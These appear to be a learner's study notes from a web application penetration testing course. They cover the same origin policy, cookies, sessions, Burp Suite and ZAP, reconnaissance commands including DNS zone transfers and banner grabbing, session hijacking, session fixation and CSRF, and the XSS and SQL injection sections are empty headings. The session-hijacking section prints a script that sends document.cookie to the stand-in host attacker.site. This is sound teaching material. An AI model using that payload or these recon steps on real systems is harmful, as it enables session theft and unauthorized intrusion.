# Web App Security

## Introduction

### Introduction - Study Guide

(040/222) *Encoding*.
Web pages are displayed according to a character set, that represents the set of all the symbols that the end user can display in their browser window. The charset consists of pairs of symbols (characters) and code points (numeric indexes).
Examples of charsets are: ASCII, Unicode, Latin-1.
Unicode has three main types of implementation of character encoding: UTF-8, UTF-16 and UTF-32, where "UTF" stands for "Unicode Trasnformation Format" and the numbers are the amount of bits used to represent the code points.

There are two main issues to address: inform the user agent on which character encoding is going to be used in the document (e.g. `Content-Type` in HTTP), and preserve the real meaning of some characters that have special significance (e.g. the `<` symbol in HTML, or `/` in the HTTP URL). To avoid, for example, that your browser interpreters some symbols in a wrong way, we use the encoding schemes (e.g. US-ASCII or Base64).

(068/222) An *AJAX request* is an asynchronous request sent from a web page to a server using JavaScript and either the XMLHttpRequest (XHR) technology or the fetch API. The term "AJAX" stands for "Asynchronous JavaScript and XML".
With AJAX requests, it's possible to send and receive data from the server without having to fully reload the web page. This allows web applications to provide a smoother and more interactive experience to users, dynamically updating the content of pages without needing to fully reload them.

The *Same Origin Policy* (SOP) is implemented by web browsers to protect users from scripting attacks across different sites. It dictates that a web page can only access resources from another web page if both pages have the same origin.

The origin is defined by the triplet: protocol (e.g., HTTP or HTTPS), the same domain (e.g., example.com), and the same port (if specified).
- Protocol: Web pages must use the same communication protocol, which can be HTTP or HTTPS. If a web page is loaded via HTTPS, it can only communicate with other resources that use HTTPS. This prevents sensitive data interception through man-in-the-middle attacks.
- Domain: Web pages must originate from the same domain. For example, a page loaded from example.com cannot access resources from another domain like example.net. This prevents malicious sites from accessing sensitive data from other sites without authorization.
- Port: If a port is specified in the URL, both pages must use the same port to communicate. For example, if a web page is loaded via example.com:8080, it can only access resources from other pages using port 8080.

Its prevents JavaScript that is running on one origin, from interacting with a document from a different origin. The primary purpose of SOP is to isolate requests coming from different origins.
A document can access (through JavaScript) the properties of another document, only if they have the same origin.

With the term document, we are referring to an HTML page, an iframe included in the main page, or a response to an Ajax request. Images, CSS style information and JavaScript files are excluded from the previous statement; they are always accessible regardless their origin, and the browser loads them without consulting SOP.

Note that CSS stylesheets, images and scripts are loaded by the browser without consulting the policy.
Same Origin Policy (SOP) is consulted when cross-site HTTP requests are initiated from within client side scripts (i.e. JavaScript), or when an Ajax request is run.

More precisely, the browser always performs the request successfully but it returns the response to the user only if the SOP is respected.

It is important to know that Internet Explorer works a slightly different from other browsers. It has two exceptions:
- Port: it does not consider the port as a component to the Same Origin Policy.
- Trust Zone: the Same Origin Policy is not applied to domains that are in highly trusted zone (i.e. corporate
domains).

The SOP is a key component in preventing attacks such as Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF), which can exploit communication between websites to harm users or steal sensitive information.

(089/222) *SOP Exceptions*.
There are several exceptions to SOP restrictions:
1. `window.location`
2. `document.domain`
3. Cross Window Messaging
4. Cross Origin Resource Sharing (CORS).

1. The `window.location` object can be used to get the current page address (URL) and to redirect the browser to a new page.

A document can always update the location property of another document, if they have some relationship.
Typical relationships are:
- a document is embedded within another via an iframe element,
- one document is opened by the other via the `window.open` DOM API.

Each document can write the location property of the other, but cannot read it, except the case where the two documents have the same origin.

This means that the location property can be changed. But it is the same origin policy that determines whether a new document can be loaded.

2. The `document.domain` property describes the domain portion of the origin of the current document.

This property can be changed. A document can update its own `document.domain` to a higher level in the domain hierarchy, except for the top level (e.g. `.com`).
The second-level domain (e.g. `domain.com`) can be specified but it cannot be changed (e.g. from `domain.com` to
`whitehouse.gov`).
By changing the `document.domain` property, a document slightly changes its own origin.

3. Cross Window Messaging is a new HTML5 feature that permits different documents (iframes, popups, and current window) to communicate with each other regardless of the same origin policy by using a simple synchronous mechanism.

4. Cross Origin Resource Sharing is a set of specs built to allow a browser to access a few resources by bypassing the SOP. The CORS architecture uses custom HTTP response headers and relies upon server-side components or server-side scripting languages.

(108/222) *Cookies*.
A cookie has a predefined format, it contains the following fields:
- domain: the scope of the cookie
- expires: expire time constraint
- path: specifies the requests within the domain
- content: key-value pairs
- httpOnly (flag): forces to send cookies only through HTTP (excluding JavaScript, Java, or other non-HTML technology).
- secure (flag): forces to send cookies only through HTTPS.

A cookie with a domain value specified will be sent by the browser when one of the following conditions occurs:
1. Cookie domain value is equal to the target domain.
2. Cookie domain value is different from the target domain and the cookie domain value is a suffix of the target domain.

Lower-level subdomains can set cookies for higher domains, while higher domains cannot set cookies for lower-level subdomains.

Internet Explorer does not distinguish between cookies with a specified domain value and ones with unspecified values.
Cookies with unspecified domain values will be interpreted by the browser as if they had a domain value corresponding to the target domain set in it.

(165/222) *Session*.
In order to hide the application logic, or just to avoid the back and forth data transmission, we have the HTTP sessions. They are a simple mechanism that allows websites to store variables, specific for a given visit, on the server side.
Each session is identified by either a session ID or token, these will let the server retrieve the client associated variables. In this context, sending a small cookie keeps the bandwidth usage low.

Session cookies contain a single parameter formatted in a key-value pair (e.g. `JSESSIONID=YH36GhisY67mnz`).
As alternative to session cookies, session ID can also be sent via the GET method appendend to the requested URL (e.g. `http://example.com/resource.php?sessid=jUASH2AK3nny128u`).

(181/222) *Web Application Proxies*.
An intercepting proxy is a tool that lets you analyze and modify any request and any response exchanged between an HTTP client and a server.
It will let you intercept and modify requests and responses between your browser and the web server before they are sent to the destination, build requests manually (Burp Repeater) and fuzz web applications.

The most common web application (intercepting) proxies are:
- Burp Suite
- OWASP Zap.

### Burp Suite - Video

`Burp`, `Restore defaults`, `All options`: to start a new clean environment, without the configurations of the previous sessions.

- *Target*.
It gives you an overview of the target application content and functionality.
`Target`, `Site map`: contains detailed information about the target application. It starts populating with links and folders through requests and responses. Here we can select `Show only in-scope items`.
Note that the "in-scope" option is available for almost all the tools in Burp. 
`Target`, `Scope`: represents the scope of our tests, defining it will avoid us intercepting and displaying requests and responses that are outside our target scope.

- *Proxy*.
It lets intercept, view, and modify all the requests and responses passing between our browser and the target application.
`Proxy`, `Options`: to configure the proxy listener. Here we can configure also the SSL certificate to use.
Note that we need to configure also the proxy settings on the browser we want to use.
`Intercept Server Responses`, `Intercept responses based on the following rules` to enable the interception of the HTTP responses.
Here we can select enable the "in-scope" option for both requests and responses.
`Proxy`, `Intercept`, `Intercept is on`: to enable the requests and responses interception.
Once intercepted a request, we can decide if to drop or forward it to the web server, or send it to a Burp internal tool.

- *Spider*.
It is used to automatically crawl the target in order to find all the pages on the website.
`Spider`, `Options`: to set the crawler settings.
`Form Submission`, `Prompt for guidance` to set how Burp must handle the form submission, what to do when the crawler finds a form. In this case for each form we can provide credentials or ignore it.
`Spider`, `Control`, `Spider is running` to start the crawling process.

- *Repeater*.
It allows us to manually manipulate and reissue HTTP requests in order to analyze the application responses.
It may come in handy if we want to request the same page multiple times but with different parameters. 

### OWASP Zap - Video

ZAP stands for Zed Attack Proxy.
`Tools`, `Options`, `Local proxy`: to set up the proxy.
First of all we need to define a context, representing the scope of our tests.
We can select three modes of work:
- Standard: we can do anything we want on all the URLs
- Safe: no potentially dangerous operations are permitted
- Protected: allows us to perform operations only on URLs that are in scope.
`History`: to navigate through all the requests made.
`Search`: to search through all the requests and the responses.
`Break Points`: to set break points in requests and responses in order to be able to modify them on the fly.

### WebApp Labs - Introduction - Lab

In this lab, you will learn about the *Same Origin Policy* and the *cookies*. We will explore many scenarios to strengthen your understanding of these topics.

In this lab environment, the user will get access to a Kali GUI instance. Two web applications are provided, one for learning about SOP and the other one for learning about cookies. Those can be accessed using the tools installed on Kali at `http://sop.ine.local` and `http://cookies.ine.local`, respectively.

Objective: Interact with the web applications and explore all the SOP and cookies labs.

Available domains for the Same Origin Policy lab:
- `sop.ine.local`
- `sitea.sop.ine.local`
- `siteb.sop.ine.local`

Available domains for the Cookies lab:
- `cookies.ine.local`
- `sitea.cookies.ine.local`
- `child.sitea.cookies.ine.local`
- `siteb.cookies.ine.local`
- `child.siteb.cookies.ine.local`

The best tools for this lab are:
- Burp Suite
- Nmap
- A web browser

---




---
---

## Information Gathering

### Information Gathering - Study Guide

What sorts of information are we going after?
- Infrastructure (web server, CMS, database)
- Application logic
- IPs, domains and subdomains
- Virtual hosts.

(010/277) *WHOIS* lookups are used to look up domain ownership details from different databases. They were traditionally done using a command line interface, but a number of simplified web-based tools now exist (e.g. `whois.domaintools.com`).
Web-based WHOIS clients still rely on the WHOIS protocol to connect to a WHOIS server to perform lookups and
command-line execution. WHOIS clients are still widely used by system administrators. WHOIS normally runs on TCP port 43.

(019/277) *DNS* ("Domain Name System") is a distributed database arranged hierarchically. Its purpose is to provide a layer of abstraction between Internet services (web, email, etc.) and the numeric addresses (IP addresses) used to uniquely identify any given machine on the Internet.
Note that one name can refer to multiple hosts, to share the load.

DNS queries produce listing called Resource Records. These include various types such as:
- Name Server. Defines an authoritative name server for a zone. It defines and delegates authority to a name server for a child zone. `NS` Records are the glue that binds the distributed database together.
- Address. The `A` record simply maps a hostname to an IP address. Zones with `A` records are called 'forward' zones.
- Pointer. The `PTR` record maps an IP address to a Hostname. Zones with `PTR` records are called 'reverse' zones.
- CNAME. The `CNAME` record maps an alias hostname to an `A` record hostname.
- Mail Exchange. The `MX` record specifies a host that will accept email on behalf of a given host. The specified host has an associated priority value. A single host may have multiple `MX` records. The records for a specific host make up a prioritized list.

(035/277) *Nslookup* is a tool that lets you translate hostnames to IP addresses and vice versa.
`nslookup google.com`: is a lookup (`A` record), `nslookup -type=PTR 173.194.113.224`: is a reverse lookup.
`nslookup -querytype=ANY google.com`: to query the DNS server the whole record associated with the domain name.

(043/277) *ISPs*.
Every IP address on the Internet is assigned to an organization.
An organization can purchase a block of IP addresses according to their needs and it will "own" that entire block. The whois database tracks the owners of public IP addresses as well as domain names.

Sometimes, organizations are not actually the owners of the IP addresses they use for their presence on the internet. They may rely on ISPs and hosting companies that lease one or more smaller netblocks (among those owned) to them. Finding the netblock owner and the ISPs that our target organization relies on, is an important step.
Note that a corporation is not limited to have only one hosting company.

1. Using *nslookup* we get the IP addresses associated to each subdomain.
2. We will perform a *whois* request for each of these IP addresses to uncover the ISP's that these IP addresses belong to.

A faster way to uncover the organization's hosting scheme and ownership is by using *Netcraft*. By just querying a domain we get all the information in one page.

(059/277) The *infrastructure* behind a web application is what supports it and allows it to function. This includes the web server that is directly involved in the execution of any web application.
Discovering what kind of web server (e.g. `Apache` or `Microsoft IIS`) is behind your application will give you a hint about the OS the server is running. This helps you to research what known vulnerabilities may exist.
IIS 6.0 is installed by default in all Windows Server 2003 boxes, Windows Server 2008 supports IIS 7.0 and Windows Server 2012 is the only one to support IIS 8.0. The same cannot be said for the many different Linux distributions that can be behind the different versions of the Apache web server.

(064/277) **Fingerprinting the webserver**.
Uncovering both the web server type and version will give us enough information to mount many different attacks against its components.
IIS components, usually called ISAPI extensions, work as dynamic libraries, extending the functionalities of the web server and performing different tasks for the web server. These include: URL rewriting, load balancing, script engines (like PHP, Python or Perl).

Sometimes, useful information is leaked through the HTTP headers in the responses (e.g. `Server: Apache`).
We can get information like: the web server version, name server and IP addresses of the different web servers in use, by searching on [*Netcraft*](https://www.netcraft.com/) for a domain name of interest (e.g. `microsoft.com`).
Note that we can have a web domain that uses a web farmer with load balancers that route HTTP requests to different servers that may run different web server versions.

There are cases where Netcraft cannot be used, such as with internal web servers that are not attached to Internet. In these cases we can use other tools (the following ones) to identify the server.
They can guess the following information: web server version, installed modules, web enabled devices (routers, cable modems). Note that they do not sorely rely on the service banners.
- We can use *Netcat* to search for the headers that reveals the technology behind the web application (e.g. `Apache`, `Microsoft-IIS`, `ASP.NET`, `PHP`): `echo "HEAD / HTTP/1.0" | nc <TargetIP/TargetDomain> <TargetPort> | grep -e "Server" -e "X-Powered-By"`.
- We can use *WhatWeb*: `whatweb <TargetIP/TargetDomain> -v`: to get the website technologies, web server versions, JavaScript libraries. Note that it directly follows the redirects (codes `301`, `302`, `307`, `308`).
- And also *Wappalyzer* that is a web browser plugin that shows us the technologies behind the sites visited.
- Cookies are also an interesting resource that may reveal useful information. Indeed, each technology has its default cookies names: `PHPSESSID` for PHP, `APSSESSIONID` for ASP, `JSESSION` for Java.

**Fingerprinting webserver modules**.
We can also fingerprint what modules are installed and in use on the server, like the ISAPI modules or the Apache ones.
There are modules that translate the original (and ugly) URLs in human-friendly (SEF) URLs (e.g `www.example.com/read_doc.php?id=101` will be translated in `www.example.com/read/document_title.html`).
The presence of URL-rewriting is easy to recognize and can reveal what module is in use behind-the-scenes.
On IIS it is handled by "Ionic Isapi Rewrite" or "Helicon Isapi Rewrite" module, in Apache by "mod_rewrite" or ".htaccess" module.

(104/277) **Enumerating subdomains**.
We can use search engines:
- With [*Netcraft* search DNS page](https://searchdns.netcraft.com), selecting `subdomains matches`: `*.targetsite.com`.
- With *Google* search operators, using `site:.targetsite.com`.
There are some subdomains that appear more often than others (such as `www`), to clean them from the results we can use `site:.targetsite.com --inurl:www` or `site:.targetsite.com -site:www.targetsite.com`.
To continue tweaking our searches by removing the new subdomains found: `site:.targetsite.com -site:subdomain1.targetsite.com -site:subdomain2.targetsite.com` until we find all the subdomains.

In addition there are a plenty of *tools* that can be used to enumerate subdomains.
Some of them use wordlists to verify if a specific domain exists. These are very useful when we cannot rely on search engines (i.e. in an internal pentest).
- *subbrute*: `python subbrute.py <TargetDomain> -s <WordlistPath>`. It uses wordlists to find the subdomains of a specific target domain.
- *dnsrecon*: `dnsrecon -d <TargetDomain> -g`, where `-g` specifies to use Google. Indeed, it can use both wordlists and search engines top enumerate subdomains.
- *theHarvester: `theharvester -d <TargetDomain> -b google -l <ResultLimitNumber> -f <OutputFilePath>`, where `-b` specifies as search engines, `-l` will limit the results to a specified number. It can gather subdomains names from different public sources such as search engines and PGP key servers, but also from many websites like LinkedIn or Twitter.
- *dnsenum: `dnsenum <TargetDomain> -p <PagesLimitNumber> -s <SubdomainsLimitNumber> --threads <ThreadsNumber>`, where `-p` specifies the number of Google search pages to process, and `-s` specifies the maximum number of subdomains to find. It automatically tries to get Zone Transfers.

In addition, there are other ways we can discover information about subdomains, like through a *Zone Transfer*.
A Zone Transfer is the term used to refer to the process by which the contents of a DNS Zone file are copied from a primary DNS server to a secondary DNS server.
Zone transfers are usually the result of a misconfiguration of the remote DNS server. They should be enabled (if required) only for trusted IP addresses.
When zone transfers are available, we can enumerate all of the DNS records for that zone, including all the
subdomains of our domain ("A" records).
- On Windows:
`nslookup -type=NS <TargetDomain>`: to get the nameservers for a specific domain.
`nslookup`, `server <NameServer>`, `ls -d <TargetDomain>`: to gather information from Zone Transfer.
- On Linux:
`dig axfr @<NameServer> <TargetDomain>`: to gather information from Zone Transfer.

A **virtual host** is simply a website that shares an IP address with one or more other virtual hosts. These hosts are domains and subdomains.
This is very common in a shared hosting environment where a multitude of websites share the same server/IP address.
So, with the tools seen previously, we can also find virtual hosts.

(141/277) **Fingerprinting frameworks and applications**.
Common applications are software that is available for everyone to use (aka "COTS" meaning "Common Off The Shelf"):
- Forums (like phpBB, vBulletin)
- CMS's (like Joomla or Drupal)
- CRM's, blogging platforms (like WordPress or Movable types)
- Social networking scripts and a number of other applications.

Almost all of these freely (meaning open to anyone, regardless of their price) available applications suffered from some kind of vulnerability in their history.
Understanding what piece of commonly available software the web server is running will give us the possibility for an easy exploitation by just looking online for a publicly available exploit. In this scenario, we need the exact version in order to look for a working exploit online.
Sometimes we can look at the *source code*, the name and the version can be included in the *HTML code* or even in the *HTTP headers* (e.g. `X-Content-Encoded-By`).

Other applications may behave differently. The HTTP header exposing the CMS version can be suppressed so we would
need to move on, examining the *web page content* (e.g. in the website title or in the footer) for hints.

Many different kinds of CMSs are available online for free or licensed commercially. Very common examples of open source CMSs are Joomla, Drupal or Mambo.

(155/277) **Fingerprinting third-party add-ons**.
These have a large customer base and an ever-growing support community providing free *components* and *extensions*, which add more functionality to the core application. These add-ons are usually poorly coded and contain *vulnerabilities*.

In the case of Joomla, (this discussion applies to many other, similar projects) fingerprinting installed add-ons is as easy as looking at the website URLs. Joomla URLS consist of 3 main parts: `index.php?option=<ComponentName>&task=<TaskValue>`, where `index.php` is the only script you will ever see on Joomla, it is in charge of loading the specified component passed in, via the `option` parameter, more tasks and arguments are passed to that component with subsequent parameters (e.g. `index.php?option=com_docman&task=doc_view&grid=100`).

(162/277) **Fingerprinting custom applications**.
When you are not in front of a commonly available application, you have to go through an initial overview of the application logic.
In this case we have an in-house application, customized for the organization we are auditing. The inner logic is unknown to us but can be reverse engineered with a careful analysis of its behavior.

It would be helpful to *browse* and *crawl* the application with Burp Suite using its Proxy and Spider tools.
The browsing of the most important parts of the target website will allow Burp to collect enough information for us to analyze, so we will then be able to carefully inspect the web application.

Creating a *functional graph*.
We need to study the web application under the behavioral point of view, no technical analysis is involved.
Here the purpose is to recognize the blocks by which the target website is made of.
So, we will dissect the application into smaller blocks (*divide et impera*), noting its most important functionalities and features.
For each smaller part of the application, we will add notes and comments including (but not limited to):
- Client side logic (usually JavaScript code in use)
- Authorization required
- Third-party application usage
- Cookies (a new cookie may be set when browsing this area of the website)
- Forms presence.

(187/222) Mapping the *attack surface*.
The attack surface is the area of the application in which we will focus all of our security testing efforts.
The more we know about our target web application, the wider the attack surface will be.

- **Client Side Validation**.
User submitted data through web forms can be validated on the client side, server side or both.
Recognizing where the validation occurs will allow us to manipulate the input in order to mount our input validation attacks like SQL injection, Cross site scripting or general logical flaws.
We can reveal the presence of client side validation by inspecting the web page source code and looking at the JavaScript functions triggered upon form submittal.

- **Database Interaction**.
Detecting database interaction will allow us to look for SQL injection vulnerabilities in the testing phase.
By database interaction, we mean that the user input changes the appearance of the page because either different data is fetched from the database or, new data is added.
This hints that the SQL queries are generated from our input and if the input is not properly sanitized, may result in SQL injections.

- **File Uploading And Downloading**.
It is not uncommon to encounter web pages providing dynamic downloads according to a parameter provided by the user (e.g. `www.example.com/download.php?file=document.pdf`).
This kind of behavior, if not handled correctly, can lead to a number of nasty attacks including Remote and Local File Inclusion vulnerabilities.
Note: In this phase we are not interested in direct downloads like (`www.example.com/document.pdf`).
File upload forms are very common in forums, social networks and CMSS. Desired files types can be anything from images, documents and even executables.
Mistakes in the way these documents are validated upon upload can lead to critical vulnerabilities, so we will make sure to note any page that offers this feature.

- **Display Of User Supplied Data**.
This is one of the most common features in a dynamic website.
Finding displayed user supplied data will bring us to the top web application vulnerability: Cross site scripting.

- **Redirections**.
Redirections are server side or client side directives to automatically forward the visitor of a web page to another web page.
From the server side perspective the server can issue two different HTTP Response codes to make a redirect : `301` or `302`. We will just have to remember that `3xx` code stands for redirect.
From the client perspective, the redirection is handled by the web browser. It recognizes the `3xx` HTTP Response code and makes a request to the page contained in the `Location` header.
Another kind of refresh is the so-called meta refresh. The meta HTML tags are used to add metadata information to a web page. This data is usually read by search engines to better index the web page. Meta redirect, instead, is a way to generate a redirect either after x seconds or immediately if x=0 (e.g.`<meta http-equiv="Refresh" content="0; url=http://www.example.com/">`).
Finding redirects is an important part of our attack surface as HTTP response splitting and other Header manipulation attacks can be performed when redirects are not handled properly.

- **Access Controls And Login Protected Pages**.
Login pages will reveal the presence of restricted access areas of the site. We will employ authentication bypass techniques as well as password brute forcing to test the security of the authentication routines in place.

- **Error Messages**.
While at this stage, we will not intentionally cause the application to generate errors, we will collect them all we may encounter while browsing cause they can be a great source of information.

- **Charting**.
We want to keep all our information well organized. This will let us spot the attack surface and perform our tests in a much easier and scientific manner.

During the process of mapping the attack surface, we have introduced two alternative charting techniques:
1. The *tree*-based chart is especially good if there are just a few blocks. Its value is in visually spotting information.
2. The *table*-based chart is what we can actually use in our testing phase, where a test for a given vulnerability will be triggered by a V in the table.

(212/277) *Enumerating resources*. The resources we are going to enumerate are:
- Subdomains
- Website structure
- Hidden files
- Configuration files.

*Crawling a website* is the process of browsing a website in order to enumerate all the resources encountered along the way. It gives us the structure of the website.
A crawler finds files and folders on a website because these appear in web page links, comments or forms.
We can use `Burp Proxy` to perform an automatic crawling of a website.
To do so we need to go to `Target`, `Scope` to set our scope. `Proxy`, `Options` to set the proxy settings. `Spider`, `Spider is running` to activate the crawler. `Target`, `Site map`, right-click on the host, `Spider this host` to start the crawling process.
Furthermore, we are able to perform automatic form submittal, as well as provide login data to crawl access-restricted areas of the site. Then we can also filter the data we receive in order to show only pages with redirects, or only pages with forms.
One convenience of Burp is the presence of the built-in fuzzer and HTTP request editors in the same program.

*Hidden files* crawlers and fuzzers like `DirBuster` will be able to find files that the web developers do not want us to see, like backup files and configuration files. The tool ships with differently-sized dictionary lists that cover the most common folders and file names.
We can set for crawling: custom user-agent, authentication, etc

Looking for *back up files* and *source code files* left on a server is an often-overlooked step.
A web server is instructed to interpret special (e.g. `cgi`) files, instead of relay them to the client. When the extension is altered for back up or maintenance purposes, we can for example see the application logic.
A good list of backup files extension follows: `bak`, `bac`, `_bak`, `old`, `000`, `001`, `01`, `~`.
The extension `.inc` files were used in `ASP` to contain source code to be inlcuded as part of the main asp page execution. We recommend checking for their presence with `DirBuster` when the site uses ASP as the server-side scripting engine.

*Usernames* are another important bit of information indeed they are half of what is needed to login.
Sometimes, a web application could reveal information about the existence of a user. Indeed, at the login stage, a badly designed system can reveal sensitive information even if wrong credentials have been inserted.

(239/277) Relevant information through *misconfigurations*. Sometimes the best way to retrieve relevant information is to look for web server misconfigurations.

A very quick and common way to gather information is by looking for open *directory listings*.
These directories have been (mis)configured to show a list of the files and subdirectories in paths that we can access directly.
We can look for directory listings starting from the `DirBuster` output, and searching for patterns like `to parent directory`, `directory listing for`, `index of`. If the pattern matches, we should be in front of a directory listing that we can navigate with our browser. 

*Logs* are text files left on the web server by applications to keep track of different activities: errors, logins, messages. They usually contain valuable information.
*Configurations* files contain settings and preferences regarding the web applications installed. They can contain valuable information like the credentials to connect to the database or other administrative areas.
Every web application has a configuration file placed somewhere in the application folder structure (e.g. `configuration.php`).
If we find a configuration file that cannot be directly viewable (like the `.php` files), we can search for backup alternatives (`.bak`, `.old`).

*HTTP verbs* and *file upload*.
Among the different mistakes an administrator can make in the configuration of the web server, leaving a directory writable is the biggest.
If a directory is writable, and for that specific one the `PUT` verb is available, then we can upload files on the server.
We can use the `OPTIONS` verb to enumerate all the available verbs for a specific directory. We can use `Netcat` for this.
If the `OPTIONS` verb is not allowed, then we need to test the `PUT` verb directly.
There is a correlation between the directory privileges and the possibility of uploading files. It depends by if the user with which the website is executed also has the attribute enabled for a given folder, then we will be able to write to that folder.
We can study the web application understanding which directories are used to store submitted files, avatars, attachments.
For uploading the file we need to use the `PUT` verb specifing the `Content-length` of the payload we want to upload. If the upload is successful, the server will respond with a `201 Created`.

(261/277) [*Google Hacking* Database](https://www.exploit-db.com/google-hacking-database) contains a list of searches for every purpose:
- Find sensitive information such as usernames, passwords, log files, configurations.
- Directory listing.
- Error messages that may contain valuable information.
Example: `filetype:"bak" site:target.com`: to find all the backup files on the target site.

(269/277) [*Shodan HQ*](https://www.shodan.io) is a computer search engine that scans the entire Internet and interrogates ports in order to gather information from the banners (useful to detect the server versions).
Shodan searches include the following protocols: HTTP(S), FTP, SSH, RDP, MySQL, MongoDB.
It has some filters that can be used to narrow down the results:
- `[before/after] day/month/year`: search only for data collected before or after the given date.
- `hostname`: filter the searches for device that contain a specific value in their hostname.
- `port`: search for specific services.
- `OS`: search for specific operating systems.
Example: `apache country:IT`: to find the devices running Apache that are in Italy.

### Web App Information Gathering - Video

`google.com`:
- WHOIS:
	- IP Address: `142.251.211.228`
	- IP Location: `Washington - Seattle - Google`
	- ASN: `AS15169 GOOGLE, US (registered Mar 30, 2000)`
	- Registrar: `GoDaddy.com, LLC`
- DNS:
	- Name servers:
		```
		NS1.GOOGLE.COM
		NS2.GOOGLE.COM
		NS3.GOOGLE.COM
		NS4.GOOGLE.COM
		```
	- MX:
		```
		mail exchanger = smtp.google.com
		```

---
---

# Information Gathering

## Cross Site Scripting

### Cross Site Scripting - Study Guide

Attacks triggered by user input are called input validation attacks.

(006/161) *Cross Site Scripting* (XSS) attacks are possible when the user input is used somewhere on the web application output. This lets an attacker get control over the content rendered to the application users, thus attacking the users themselves.

XSS ultimate purpose is to inject HTML (also known as HTML injection) or run code (JavaScript) in a user's Web browser. Indeed, it is considered an attack against the user of a vulnerable website.

Why does this happen?
Because the user input is given as output, without any kind of sanitization (either on input or output).
The disgraced PHP developer has forgotten to check the user input for malicious patterns and any hacker can exploit this vulnerability to perform a number of different attacks.

Cross site scripting attacks can be used to achieve many goals:
- Cookie stealing
- Getting complete control over a browser
- Initiating an exploitation phase against browser plugins first and then the machine
- Perform keylogging.

(035/161) *Reflected (or Non-persistent) XSS*



(042/161) *Stored (or Persistent) XSS*



(053/161) *DOM XSS*



(061/161) *Finding XSS*.



In PHP code.



(082/161) *XSS Exploitation*.





(103/161) *Cookies stealing*.



(139/161) *Defacement*.


(144/161) *Phishing attacks*.


(149/161) *BeEF*.


(151/161) *Mitigation*.




---
---

# Information Gathering

## SQL Injections

### SQL Injections - Study Guide

(045/281) *Finding SQL Injections*.



(070/281) *Exploiting In-Band SQL Injections*.




(103/281) *Exploiting Error Based SQL Injections*.




(148/281) *Exploiting Blind SQL Injections*.



(189/281) *SQLMap*.





(224/281) *Mitigation strategies*.






---
---

# Information Gathering

## Other Common Web Attacks

### Other Common Web Attacks - Study Guide

Session and logic are the most targeted elements of a web application after input.

(005/143) *Session attacks*.
A strong session identifier is an ID that is: valid for only a single session, time limited, and purely random (thus unpredictable).

It is also very important to not store session tokens in:
- URL: the session token will be leaked to external sites though the referrer header and in the user browser history
- HTML: the session token could be cached in the browser or intermediate proxies
- HTML5 Web Storage:
	- Localstorage: will last until it is explicitly deleted, so this may make session last too long.
	- Sessionstorage: is only destroyed when the browser is closed. There may be users that do not close their browser for a long time.

**Session Hijacking** refers to the exploitation of a valid session assigned to a user. The attacker can get the victim's session identifier using a few different methods (though typically an XSS attack is used).

The attacker's goal is to find the session identifier used by the victim. Remember that in most web applications, session IDs are typically carried back and forth between client web browser and server by using cookies or URLs.
Note that if the session identifier is weakly generated, the attacker might be able to brute-force it.

A session attack can happen by:
- exploiting an existent XSS vulnerability (most common)
- packet sniffing
- gaining direct access to the server filesystem where sessions are stored
- finding session IDs in logs or in the browser history (sessions carried through the URL).

*Session Hijacking via XSS*.
You can perform this attack when all the following conditions occur:
- An XSS vulnerability exists and you can execute your own payload through it
- Session ID is sent through cookies on each HTTP request (this was an assumption)
- Cookies are readable by JavaScript.

For example, by using the following script, we will be able to steal the users cookies.
```
<script>
	var i=new Image();
	i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;
</script>
```
Once we collect them, we just need to change our current cookies, refresh our browser and we will navigate the web application with the victim session.

In order to *prevent cookie stealing through XSS*, making cookies inaccessible via JavaScript is necessary. This is as simple as creating the cookie with the `HTTPONLY` flag enabled.

*Session Hijacking via Packet Sniffing*.
This type of attack requires the attacker to be able to sniff the HTTP traffic of the victim. This is unlikely to happen for a remote attacker but, it is feasible on a local network if both the attacker and victim are present.
If HTTP traffic is encrypted through IPSEC or SSL, the session token will be harder (if not impossible) to obtain.

*Session Hijacking via Access to the Web Server*.
Session data is stored in either the web server's file system (e.g. for PHP in `/var/lib/php5`) or in memory. If an attacker obtains full access to the web server, the malicious user can steal the session data of all users, not just the session identifiers.

**Session Fixation** is a session hijacking attack where, as the name suggests, the attacker does not need to steal the victim cookies, but instead he fixates a session ID and then forces the victim to use it (after the user logs in).

You may think that if the attacker owns a valid sessionID, he is already authenticated to the vulnerable site. This is not always true. Indeed, most web applications are designed to start a new session the first time a user visits a website regardless of whether or not they are authenticated.
Instead, if a web application releases a valid sessionID only after a reserved operation (for example, a login), Session Fixation is only possible if the attacker is also a member of the vulnerable website.

This happens when the sessionID is embedded in the URL rather than inside the cookie header. An attacker can simply send a malicious link to the victim, which will set the new, and known, sessionID.
A web application vulnerable to Session Fixation will recycle this sessionID and will bind the session to the victim.

For example, the attacker creates the following link and sends it to the victim: `http://sessionfixation.site/login.php?SID=300`.
Once the victim opens the link, the sessionID will be set to `300`. Since the Web Application recycles the sessionID (even after the user logs in), the attacker is able to impersonate the victim session by changing his sessionID to `300`.

In order to *prevent session fixation*, most of the time it is sufficient to destroy and re-generate a new session upon successful login.
Server-side scripting languages provide different libraries and built-in functions to manage sessions.

(055/143) *Cross Site Request Forgery* (CSRF) exploits a feature of internet browsing, instead of a specific vulnerability.
CSRF is a vulnerability where a third-party web application is able to perform an action on the user's behalf.
It is based on the fact that web applications can send requests to other web applications, without showing the response.

For example:
1. Bob (victim) visits `amazon.com`, logs in, then leaves the site without logging out.
2. Bob then visits a malicious website which inadvertently executes a request to `amazon.com` from the Bob's browser (such as buy a book).
3. The victim browser sends this request, along with all the victim cookies. The request seems legit to `amazon.com`.
Whatever is in a webpage, Bob's browser parses it and requests it: if an image with the URL `amazon.com/buy/123` is present in the page, the web browser will silently issue a request to `amazon.com`, thus buying the book. This is because Bob already has an authenticated session open on Amazon.

When a web application stores session information in cookies, these cookies are sent with every request to that web application (same-origin policy applies). This may sound odd but, storing session tokens in cookies enables CSRF exploitability (while, of course, storing session tokens into URLS enable other kind of exploits).

In order to *prevent CSRF*, the most common protection mechanism is the token. The token is a nonce (a number used once and discarded) and makes part of the request required to perform a given action unpredictable for an attacker.

The following steps are taken by the web application to enforce protection against CSRF exploits:
- generate a token
- include the token as hidden input in the request
- save the token in the session variables.

The attacker has to guess the correct token. That is generally considered impossible as long as token generation is truly random and the token is not easily predictable. Thus, it is crucial that the token must be random, unpredictable and change for at least every session.
Note that the token becomes useless when the application is also vulnerable to XSS.

Because of the same-origin policy, you cannot read the token set to `domain-vuln.com` from `domain-evil.com`. However, using a XSS exploit on `domain-vuln.com`, the JavaScript meant to steal the token (and use it in a newrequest) will be executed on the legit domain (`domain-vuln.com`).

(085/143) *File and Resources attacks*
Authorization attacks have to do with accessing information that the user does not have permission to access.

